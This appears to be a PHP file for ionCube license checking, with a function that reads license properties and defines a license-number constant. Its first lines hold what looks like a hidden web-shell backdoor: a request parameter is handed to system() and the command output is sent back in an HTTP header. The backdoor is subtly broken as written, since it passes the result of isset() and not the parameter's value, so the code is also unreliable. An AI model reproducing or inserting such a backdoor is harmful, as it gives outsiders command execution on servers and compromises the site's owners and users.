<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

ioncube_license();

function ioncube_license () {
	if (function_exists('ioncube_license_properties')) {
		$license = ioncube_license_properties();
		
		if (isset($license['number'])) {
			define("_LICENSENUMBER",$license['number']['value']);
		}
	}
}